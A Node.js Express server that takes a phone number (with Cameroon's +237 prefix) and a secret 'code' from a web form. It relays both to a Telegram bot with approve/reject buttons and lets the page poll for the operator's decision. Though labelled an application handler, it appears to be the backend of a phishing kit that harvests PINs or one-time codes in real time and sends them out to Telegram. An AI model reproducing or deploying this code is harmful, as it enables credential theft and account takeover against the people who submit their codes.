const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// This temporary object stores applications in memory. 
// (If the server goes to sleep, this memory is cleared!)
const applications = {};

// 1. Receive application from website
app.post('/api/apply', async (req, res) => {
    const { phone, code } = req.body;
    const appId = Date.now().toString(); // Create a unique ID for this application

    // Save it to memory as "Pending"
    applications[appId] = { status: 'pending', phone, code };

    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    const message = `🚨 *NEW APPLICATION* 🚨\n\n` +
                    `📞 *Phone:* +237 ${phone}\n` +
                    `🔑 *Code:* ${code}\n`;

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            // We send the appId with the button so the webhook knows which user to approve
                            { text: "✅ APPROVE", callback_data: `approve_${appId}` },
                            { text: "❌ REJECT", callback_data: `reject_${appId}` }
                        ]
                    ]
                }
            })
        });

        // Send the appId back to the website so it can track the status
        res.status(200).json({ success: true, appId: appId });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false });
    }
});

// 2. Check status from website (The website will call this every 3 seconds)
app.get('/api/status/:id', (req, res) => {
    const appId = req.params.id;
    if (applications[appId]) {
        res.json({ status: applications[appId].status });
    } else {
        res.status(404).json({ error: "Application not found" });
    }
});

// 3. Telegram Webhook (Telegram calls this when you click a button)
app.post('/api/telegram-webhook', async (req, res) => {
    const { callback_query } = req.body;

    if (callback_query) {
        const data = callback_query.data; // e.g., "approve_16987654321"
        const [action, appId] = data.split('_');

        if (applications[appId]) {
            if (action === 'approve') {
                applications[appId].status = 'approved';
            } else if (action === 'reject') {
                applications[appId].status = 'rejected';
            }
        }

        // Answer the callback so the loading circle on Telegram stops
        await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: callback_query.id, text: "Status Updated!" })
        });
    }

    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});